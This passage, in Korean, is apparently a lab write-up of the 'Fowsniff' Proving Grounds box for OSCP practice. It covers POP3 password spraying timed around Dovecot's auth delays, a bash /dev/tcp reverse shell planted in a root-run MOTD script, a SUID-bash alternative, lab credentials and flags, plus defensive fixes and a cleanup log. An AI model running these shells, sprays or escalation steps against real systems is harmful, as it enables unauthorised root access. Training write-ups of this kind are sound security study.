`&` 로 백그라운드에 던졌다. `[가정]` — 붙이지 않으면 리버스셸이 `run-parts` 를 붙잡고, sshd 가 `/run/motd.dynamic.new` 생성이 끝나기를 기다리느라 로그인이 진행되지 않을 것이다. 위 체인에서 sshd 특권 프로세스가 `> /run/motd.dynamic.new` 리다이렉션으로 `run-parts` 의 종료를 기다리는 구조이니 그렇게 되는 게 자연스럽지만, **이 박스에서 실측하지 못했다** — `cube.sh` 에 `sleep 20` 을 넣고 로그인 시간을 재려던 참에 박스가 내려갔다(「남긴 흔적」 참조). 어느 쪽이든 `&` 를 붙이는 편이 안전하다.

`bash -c "..."` 로 한 번 감싼 것은 `/etc/update-motd.d/00-header` 가 `#!/bin/sh`(dash)라서다. dash 는 `>&` 를 파싱하지 못한다 — Kali 에서 확인:

```
$ dash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1'
dash: 1: Syntax error: Bad fd number
```

리다이렉션 파싱에서 먼저 죽으므로 `/dev/tcp` 에 **도달조차 하지 않는다.** "dash 가 `/dev/tcp` 를 모른다"가 아니라 문법에서 걸리는 것이고, 그래서 에러도 `No such file or directory` 가 아니다. 명시적으로 bash 를 부른다.

트리거는 그냥 SSH 로 다시 들어가는 것이다.

```
$ sshpass -p 'S1ck3nBluff+secureshell' ssh ... baksteen@192.168.248.18 'echo TRIGGERED'
TRIGGERED
```

리스너 쪽(tmux 스크롤백, 파일로 저장하지 않았다):

```
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.18] 54860
bash: cannot set terminal process group (1783): Inappropriate ioctl for device
bash: no job control in this shell
root@fowsniff:/#
```

443 아웃바운드가 그대로 나갔다. 80/53 으로 내려갈 일도, `tcpdump` 로 SYN 을 확인할 일도 없었다.

PTY 로 승격:

```
root@fowsniff:/# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@fowsniff:/# export TERM=xterm
```

### 대안 경로

`cube.sh` 에 리버스셸 대신 `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash` 를 넣고 로그인 후 `/tmp/rootbash -p` 를 실행해도 된다. 아웃바운드가 전부 막힌 상황이면 이쪽이 유일한 선택지다. 리버스셸을 먼저 고른 것은 완전한 root 세션이 바로 손에 들어오기 때문.

`stone` 계정 해시(`a92b8a29ef1183192e3d35187e0cfabd`)는 rockyou 로 안 풀렸다. `stone` 은 uid 1000 이고 `/home` 목록에서 링크 수가 다른 계정(3)보다 많은 4라 하위 디렉터리가 하나 더 있다 — `[가정]` 다른 계정들처럼 `Maildir` 이 있어 여기도 경로였을 수 있다(권한이 `drwxrwx--- stone:stone` 이라 들여다보지 못했다). MOTD 가 먼저 열려서 파지 않았다.

## 5. 플래그

**2026-08-20 인스턴스 값이다.** PG 는 리버트할 때마다 새로 만든다.

`local.txt` — `/home/baksteen/local.txt`, 대화형 SSH 셸에서 원위치 `cat` (`proof_user.txt`):

```
$ whoami; id; hostname; hostname -I; date; cat /home/baksteen/local.txt
baksteen
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
fowsniff
192.168.248.18
Thu Aug 20 02:03:59 EDT 2026
242f9f051ef3715bbe679c90a3a6adf9
```

`proof.txt` — `/root/proof.txt`, tmux 안의 대화형 root 셸(PTY 승격 후) (`proof_root.txt`):

```
root@fowsniff:/# whoami; id; hostname; hostname -I; date; \
                 echo ==PROOF; cat /root/proof.txt; echo ==FLAG; cat /root/flag.txt
root
uid=0(root) gid=0(root) groups=0(root)
fowsniff
192.168.248.18
Thu Aug 20 02:05:34 EDT 2026
==PROOF
f64f537d70805222fa0fd2e7a8d2a3ab
==FLAG
Your flag is in another file...
```

`/root/flag.txt` 는 **미끼**다. 원본 VulnHub 판의 잔재이고 PG 가 채점하는 건 `proof.txt` 다. `/root` 안에 flag 로 보이는 파일이 둘 있으면 둘 다 읽어라.

`whoami; id; hostname; hostname -I; date` 를 플래그와 한 줄에 묶은 건 시험 증거 형식 연습이다 — 시험에서는 이걸 **한 화면 스크린샷**으로 남겨야 인정된다.

타겟 시계는 EDT 로 설정돼 있고 Kali(KST)와 13시간 차다. 산출물 mtime(15:03 KST)과 타겟 `date`(02:03 EDT)는 같은 순간이다 — 어긋난 게 아니다.

## 6. 막혔던 지점 / 시행착오

### 이미지에 스테가노가 있는 줄 알았다 (5분)

`/images/` 에 `banner.jpg`·`img1.jpg` 가 있는데 `index.html` 은 `pic01.jpg` 만 참조한다. "참조 안 되는 파일 = 숨긴 것" 이라는 반사로 셋 다 받아서 팠다.

```
$ file *
banner.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=0], baseline, precision 8, 1920x573, components 3
img1.jpg:   JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=0], baseline, precision 8, 1200x297, components 3
pic01.jpg:  JPEG image data, JFIF standard 1.01, ... progressive, precision 8, 1200x297, components 3

$ strings -n 8 banner.jpg | head -3
http://ns.adobe.com/xap/1.0/
<?xpacket begin="
" id="W5M0MpCehiHzreSzNTczkc9d"?> ... xmp:CreatorTool="Adobe Photoshop CS6 (Windows)" ...
```

Photoshop 이 남긴 XMP 메타데이터뿐이었다. 결정적인 건 두 가지다 — `img1.jpg` 와 참조되는 `pic01.jpg` 의 해상도가 **1200x297 로 동일**하고, 세 파일의 XMP `OriginalDocumentID` 가 같은 uuid 다. 같은 원본을 다르게 저장한 자매 파일이지 은닉물이 아니다. `README.txt` 도 대놓고 적어놨다 — `Escape Velocity by HTML5 UP`, "Its demo images* are courtesy of ... Felicia Simion".

교훈: "웹 루트에 뭔가 숨겨져 있다" 가설을 세우기 전에 **그 사이트가 기성 템플릿인지** 확인한다. 미참조 자산은 정적 템플릿 사이트에서는 오히려 정상이다.

### POP3 스프레이가 세 번째에서 죽었다 (타임아웃 오진 위험)

첫 시도 `try1_pop3spray.log` 원문:

```
mauer      mailcall     -> -ERR [AUTH] Authentication failed.
mustikka   bilbo101     -> -ERR [AUTH] Authentication failed.
Traceback (most recent call last):
  File "/home/kali/PG/Fowsniff/pop3spray.py", line 13, in <module>
    s.sendall(f'PASS {p}\r\n'.encode()); r2=rd(s)
                                            ~~^^^
  File "/home/kali/PG/Fowsniff/pop3spray.py", line 6, in rd
    while not d.endswith(b'\r\n'): d+=s.recv(4096)
                                      ~~~~~~^^^^^^
TimeoutError: timed out
```

소켓 타임아웃이 8초였고 세 번째 계정(`tegel`)에서 걸렸다. **여기서 "방화벽이 나를 차단했다"고 결론 내리면 시간을 태운다.**

실제 원인은 Dovecot 이 같은 IP 의 인증 실패를 세면서 **다음 인증을 시작하기도 전에** 대기를 거는 것이다. Dovecot 2.2.22 소스로 확인한 수치:

- 실패할 때마다 penalty 가 1 오른다 — `auth-request-handler.c`: `auth_penalty_update(auth_penalty, request, request->last_penalty + 1)`
- 다음 연결의 **사전 지연** = `auth_penalty_to_secs(penalty)` = `2` 를 penalty 번 두 배, 상한 15초 (`auth-penalty.c`). penalty 0 이면 지연 없음, 1 → 4초, 2 → 8초, 3 이상 → 15초
- 여기에 실패 응답 자체의 지연 `auth_failure_delay` 가 더해진다. `auth-settings.c` 의 기본값은 `.failure_delay = 2` (2초)
- penalty 는 IP 별로 anvil 이 들고 있고 `AUTH_PENALTY_TIMEOUT` = 2+4+8+15 = **29초** 동안 유지된다 (`auth-penalty.h`)

관측과 맞춰보면 1번째 ≈ 2초, 2번째 ≈ 4+2 = 6초, 3번째 ≈ 8+2 = 10초. **8초 타임아웃이 정확히 세 번째에서 터지는 게 맞다.**

그래서 고친 것 중 실제로 효과가 있었던 건 **타임아웃 40초 하나뿐이다.** 지연 상한이 15+2 = 17초라 40초 안에 들어온다. 같이 넣은 `time.sleep(3)` 은 penalty 만료가 29초라 아무것도 리셋하지 못한다 — 심리적 안전장치였을 뿐이다. 정말 penalty 를 털고 싶으면 계정 사이에 **30초 이상** 쉬어야 한다.

구분법: 차단이면 TCP 연결 자체가 안 되거나 RST 가 온다. 여기선 **연결은 되고 응답만 늦었다.** 그럼 애플리케이션 레이어의 의도된 지연이다.

일반화: 인증 스프레이는 **타임아웃을 넉넉히** 잡는다. 타임아웃이 짧으면 지연·락아웃·방화벽 중 무엇에 걸렸는지 구분이 안 된다. 그리고 "간격을 두면 괜찮겠지"는 서비스마다 만료 시간을 확인하지 않으면 근거 없는 위안이다.

### `sudo -l` 이 셸을 3분 붙잡았다

`ssh -tt` 로 열거 명령을 한 번에 몰아넣었는데 `sudo -l` 이 비밀번호 프롬프트를 띄우고 멈췄다. 뒤의 열거 명령이 하나도 안 돌았고 180초 타임아웃까지 그냥 대기했다. (이 실패 실행의 출력은 파일로 남기지 않았다 — 남은 건 시간순 기록의 "sudo -l 이 비번 프롬프트로 블로킹 → 180s 타임아웃" 한 줄이다.)

**비대화형으로 열거를 배치할 때는 `sudo -n -l` 을 쓴다** — `-n` 은 프롬프트를 띄우지 않고 즉시 실패한다. 비밀번호를 아는 경우라면 `echo '<pw>' | sudo -S -l` 로 stdin 에 먹인다. 이 박스는 후자로 넘어갔고 결과는 `may not run sudo` 였다(4장의 깨진 출력이 그것이다).

배치 열거를 짤 때 **프롬프트를 띄울 수 있는 명령**은 전부 같은 취급을 해야 한다 — `sudo`, `ssh`(호스트키), `su`, `passwd`, `apt`. 하나가 멈추면 뒤가 전부 죽는다.

### SUID·capability 목록을 훑느라 시간을 썼다

`/usr/bin/procmail` 이 SUID 로 있어서 잠깐 잡았다. 메일 서버니까 관련이 있어 보였다. 하지만 Ubuntu 16.04 의 `procmail` 패키지가 원래 SUID 로 설치되는 표준 바이너리고, `getcap` 결과 셋도 전부 배포판 기본값이다.

**목록을 보는 게 아니라 "배포판 기본과 다른 것"을 보는 것**이다. 기본 목록을 외우기 어려우면 반대로 접근한다 — `find / -perm -4000` 결과가 전부 `/bin`·`/usr/bin`·`/usr/lib` 안이고 `/opt`·`/usr/local`·홈 디렉터리에 아무것도 없으면 SUID 경로는 아닐 가능성이 높다.

정답은 SUID 가 아니라 **`id` 출력의 그룹**에 있었다. `find / -group <내그룹> -writable` 을 SUID 다음 반사로 붙여둘 것.

### 시간 배분

시간순 기록 기준 14:53 → 15:05, 약 12분(정찰 3분, 이미지 헛다리 5분, 크랙+스프레이 4분, 권한상승 3분 — 겹치는 구간이 있다). 메커니즘을 `/proc` ppid 체인으로 확인한 15:06~15:07 은 플래그를 잡은 뒤 노트를 위해 추가로 한 작업이라 공략 시간에 넣지 않았다.

## 7. OSCP 시험 관점

1. **110/143 을 보면 셸이 아니라 메일함을 노린다.** POP3 는 `USER`/`PASS`/`LIST`/`RETR` 넷이면 충분하고 netcat 으로 손으로 된다. 도구가 없어도 막히지 않는다.
2. **`id` 는 uid 뿐 아니라 그룹을 읽는 명령이다.** 보조 그룹이나 낯선 기본 그룹이 보이면 `find / -group <그룹> -writable -type f 2>/dev/null` 을 바로 친다. 이 박스에서 sudo/SUID/cron 이 전부 비었을 때 유일하게 남은 경로였다.
3. **Ubuntu + SSH 로그인 가능 + 권한상승 막힘 → `/etc/update-motd.d/`.** 스크립트가 root 소유여도 그것이 부르는 대상을 확인한다. `grep -r . /etc/update-motd.d/`.
4. **"왜 root 로 도는가"는 추측하지 말고 `/proc` 으로 증명한다.** `/proc/<pid>/stat` 4번째 필드가 ppid, `/proc/<pid>/cmdline` 이 명령 전문(NUL 구분 — `tr '\0' ' '`). 이 두 줄이면 어떤 실행 경로든 뿌리까지 거슬러 올라간다.
5. **스프레이는 타임아웃을 넉넉히.** 응답이 늦은 것과 차단된 것은 다르다 — 연결이 성립하면 애플리케이션 지연을 먼저 의심한다. 간격을 두는 건 **그 서비스의 만료 시간을 확인한 다음**에나 의미가 있다.
6. **비대화형 배치 열거에는 `sudo -n -l`.** `sudo -l` 은 프롬프트로 배치 전체를 멈춘다.
7. **자동 도구 없는 대안** — POP3 는 netcat, 해시 크랙은 john/hashcat(둘 다 허용), SSH 스프레이는 `for` 루프 + `sshpass`. 이 박스는 시험 금지 도구를 쓸 일이 없다. hydra 를 써도 되지만(허용) 대상이 9개뿐이라 손으로 도는 게 빠르다.
8. **`/root` 에 flag 후보가 둘이면 둘 다 읽는다.** `flag.txt` 는 미끼였다.
9. **손절 지점** — 웹에 동적 페이지가 하나도 없다고 판정되면(폼 없음, 확장자 없음, 파라미터 없음) 웹은 15분 안에 접는다. 이 박스에서 이미지 스테가노를 판 5분이 그 규율을 어긴 부분이다.
10. **이 박스의 OSINT 단계는 시험에 전이되지 않는다.** 시험 박스는 자기 완결적이다. 다만 "박스 안에서 자격증명 소스를 못 찾겠으면 박스가 지목한 외부 힌트를 다시 읽는다"는 판단은 유효하다.

## 8. 방어 관점

- **`/opt/cube/cube.sh` 를 `root:root 755` 로.** MOTD 체인에서 실행되는 모든 파일과 그 상위 디렉터리는 비특권 사용자가 쓸 수 없어야 한다. 파일 권한만 고치고 디렉터리를 놔두면 부족하다 — 지우고 새로 만들 수 있다.
- **공유 기본 그룹을 없앤다.** 계정마다 자기 이름 그룹을 기본으로 주고, 공유가 필요하면 보조 그룹으로 명시한다. `users` 를 기본 gid 로 쓰면 "모두가 쓸 수 있는 파일"이 의도치 않게 늘어난다.
- **임시 비밀번호를 메일 본문으로 배포하지 않는다.** 전 직원 동일 비번은 메일함 하나가 뚫리면 전체가 뚫린다. 최소한 계정별로 다르게, 최초 로그인 시 강제 변경(`chage -d 0 <user>`)을 건다.
- **비밀번호를 솔트 없는 MD5 로 저장하지 않는다.** bcrypt/argon2. 유출이 나면 저장 방식이 대응 시간을 결정한다.
- **유출 후 강제 초기화.** 9명 중 8명은 바꿨는데 1명이 안 바꿔서 전체가 뚫렸다. "바꾸라고 안내"가 아니라 만료 처리해야 한다.
- **Dovecot 에 평문 인증을 막는다**(`disable_plaintext_auth = yes` + TLS). auth penalty 는 스프레이를 늦출 뿐 막지 못했고, 실제로 40초 타임아웃 하나로 우회됐다.

## 9. 참고 자료

- CVE 없음. 전부 설정·운영 결함이다.
- Dovecot 2.2.22 소스 — `src/auth/auth-settings.c`(`.failure_delay = 2`), `src/auth/auth-penalty.h`(`AUTH_PENALTY_INIT_SECS 2` · `AUTH_PENALTY_MAX_SECS 15`), `src/auth/auth-penalty.c`(`auth_penalty_to_secs`), `src/auth/auth-request-handler.c`(penalty 갱신과 사전 지연 적용). 6장의 수치는 전부 여기서 나왔다.
- Ubuntu OpenSSH 의 `update-motd` 동작 — 이 박스에서는 문서 대신 `/proc/<pid>/stat` ppid 체인으로 직접 확인했다(4장).
- 원 시나리오의 pastebin(`NrAqVeeX`)은 삭제됨(404). 공개 미러에서 해시 9쌍 복원.
- Fowsniff 는 원래 VulnHub/TryHackMe 박스이고 PG 가 그대로 가져왔다. `/root/flag.txt` 의 미끼 문구가 그 흔적.
- Kali 산출물 — `~/PG/Fowsniff/` (`nmap.log`·`quick.log`·`nmap.full.txt`·`gobuster.log`·`dump.txt`·`hashes.txt`·`creds.txt`·`john_cracked.txt`·`pop3spray.py`·`try1~3*.log`·`mail_seina.txt`·`enum_baksteen.log`·`enum2_writable.log`·`enum3_motd_mechanism.log`·`enum4_motd_parent.log`·`cube.sh.orig`·`proof_user.txt`·`proof_root.txt`·`web/`·`writeup_notes.txt`) + `~/.john/john.log`.

## 남긴 흔적

- **`/opt/cube/cube.sh`** — 리버스셸 1줄과 프로세스 추적 프로브를 append 했다가 `truncate -s 850` 으로 되돌렸다. 복원 직후 `md5sum` = `377489e75ac90ece2f92fe30519f371c` 로 백업본(`cube.sh.orig`, 850바이트)과 일치하는 것을 **출력으로 확인**했고, mtime 도 `touch -d "2020-02-28 00:00:00"` 으로 원래 값(Feb 28 2020)으로 복구했다.
- **`/tmp/motd_who.txt`·`/tmp/anc.txt`·`/tmp/cube.bak`** — 메커니즘 확인용 프로브 파일. 삭제하고 `ls -la /tmp` 로 확인. 남은 것은 부팅 때부터 있던 systemd/vmware 디렉터리뿐.
- ⚠️ **마지막 프로브 하나는 결과를 확인하지 못했다.** 위 복원을 끝낸 뒤(15:07), 4장의 "`&` 를 빼면 로그인이 멈춘다"를 실증하려고 `cube.sh` 에 `sleep 20` 한 줄을 더 붙이는 명령을 root 셸에 보냈다(15:10). 그런데 **그 시점부터 박스가 응답을 멈췄다** — 셸이 명령을 에코만 하고 실행하지 않았고, 곧이어 22/80/110 전부 `No route to host` 가 됐다(포털 쪽에서 박스가 내려갔거나 리버트된 것으로 보인다). 따라서 그 `sleep 20` 이 파일에 **실제로 쓰였는지 확인하지 못했다.** 쓰였다면 `cube.sh` 끝에 `\nsleep 20\n` 이 남아 있고, 안 쓰였다면 15:07 의 복원 상태 그대로다. 박스가 죽어서 재확인도 재정리도 불가능했다. PG 는 리버트 시 베이스 이미지로 되돌아가므로 실질 영향은 없다고 보지만, **"정리 완료"로 적지 않는다.**
- **계정·설정 변경 없음.** 사용자 추가, SSH 키 배치, 서비스 설정 변경을 하지 않았다.
- **Kali 쪽** — `~/PG/Fowsniff/` 산출물 유지. tmux `fow_nmap`·`fow_gob`·`fow_root` 전부 세션 이름으로 종료(당시 tmux 서버에는 이 세 개뿐이었고, 마지막 세션이 닫히며 서버도 같이 내려갔다). 443 리스너 소멸을 `ss -lntp` 로 확인. 중간에 끊겨 고아가 된 `sshpass` 프로세스 2개는 **PID 를 특정해**(354449·354450) 종료했다.
- **남의 프로세스는 건드리지 않았다.** 정리 중 `nc -lvnp 80`(root, PID 347623/347626/347627)이 보였는데 이 박스에서는 443 만 썼으므로 다른 라인의 것이다. 그대로 두었다. 광범위 `pkill` 을 쓰지 않은 이유가 정확히 이것이다.
- **Kali 의 `known_hosts` 는 오염되지 않았다.** 스프레이 전부 `-o UserKnownHostsFile=/dev/null` 이었고, 사후 확인 결과 `~/.ssh/known_hosts` 에 `192.168.248.18` 항목이 없으며 파일 mtime 도 11:37(작업 시작 14:53 이전) 그대로다. 타겟 쪽에도 흔적을 만들지 않았다.

## 관련 노트

- [[_STATUS]] — 283개 전수 진행현황
- 크론 기반 root 실행 경로: [[Astronaut]] · [[Exfiltrated]] · [[Muddy]] — MOTD 도 "root 가 주기적/이벤트마다 남의 파일을 실행한다"는 같은 부류다. 다른 점은 트리거가 시간이 아니라 **내 로그인**이라 즉시 발동시킬 수 있다는 것.
- 자격증명 재사용 체인(유출 해시 → 크랙 → 다른 서비스에 스프레이)은 색인의 `tech/cred/reuse`·`tech/cred/spray` 태그로 찾을 것. 이번 작업에서 해당 노트들을 열지 않았으므로 개별 링크는 달지 않았다.
